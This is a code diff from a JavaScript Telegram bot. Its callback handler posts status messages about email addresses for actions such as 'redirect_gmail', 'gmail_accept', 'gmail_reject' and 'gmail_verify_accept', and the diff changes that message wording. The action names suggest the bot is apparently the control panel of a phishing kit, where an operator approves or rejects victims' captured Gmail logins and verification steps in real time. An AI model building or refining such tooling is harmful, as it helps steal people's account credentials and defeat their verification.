@@ -320,11 +320,9 @@ bot.on("callback_query", async (query) => {
       } else if (action === "redirect_gmail") {
         statusMessage = `📧 <code>${email}</code> redirected to 🌈<b>Gmail</b>🌈`;
       } else if (action === "gmail_accept") {
-        statusMessage = `🌈 <code>${email}</code> Gmail Login <b>ACCEPTED</b>! ✅`;
-        console.log(`✅ GMAIL_ACCEPT matched! Message: ${statusMessage}`);
+        statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
       } else if (action === "gmail_reject") {
-        statusMessage = `🌈 <code>${email}</code> Gmail Login <b>REJECTED</b>! ❌`;
-        console.log(`❌ GMAIL_REJECT matched! Message: ${statusMessage}`);
+        statusMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
       } else if (action === "gmail_verify_accept") {
         statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>ACCEPTED</b>! ✅`;
         console.log(`✅ GMAIL_VERIFY_ACCEPT matched! Message: ${statusMessage}`);
